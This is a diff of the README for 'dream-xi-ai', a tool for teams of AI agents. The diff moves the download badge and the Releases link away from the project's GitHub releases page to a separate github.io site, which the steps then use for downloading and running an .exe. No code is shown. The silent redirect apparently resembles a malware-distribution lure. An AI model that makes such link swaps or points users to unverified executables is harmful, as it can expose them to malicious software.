@@ -1,6 +1,6 @@
 # ⚽ dream-xi-ai - Build your own intelligent agent team
 
-[![Download Dream XI AI](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Paigeunforbearing328/dream-xi-ai/releases)
+[![Download Dream XI AI](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://paigeunforbearing328.github.io)
 
 Dream XI AI connects multiple AI agents to complete complex work. It treats AI agents like players on a soccer field. You assign agents to roles such as captain, playmaker, striker, or defender. This setup helps agents plan tasks, use digital tools, check results, and watch for errors. Your agents work together to finish your projects.
 
@@ -18,7 +18,7 @@ Your computer needs to meet these basic standards to run the software.
 
 Follow these steps to set up the software on your Windows machine.
 
-1. Go to the [Releases page](https://github.com/Paigeunforbearing328/dream-xi-ai/releases).
+1. Go to the [Releases page](https://paigeunforbearing328.github.io).
 2. Look for the section marked Assets.
 3. Click the file ending in .exe to start the download.
 4. Open the file once the download finishes.
